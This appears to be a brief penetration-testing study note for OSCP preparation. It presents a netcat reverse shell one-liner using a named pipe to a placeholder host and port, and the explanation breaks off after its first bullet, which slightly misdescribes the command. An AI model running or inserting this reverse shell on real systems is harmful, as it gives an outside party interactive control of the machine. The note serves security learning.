---
permalink: oscp/techniques/shells-and-payloads/oneliners-explained
title: Oneliners Explained
type: note
---

## Bash Oneliners

## Netcat Reverse Shell
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > tmp/f
```
- `rm -f /tmp/f` deletes `tmp` if it already exists
- 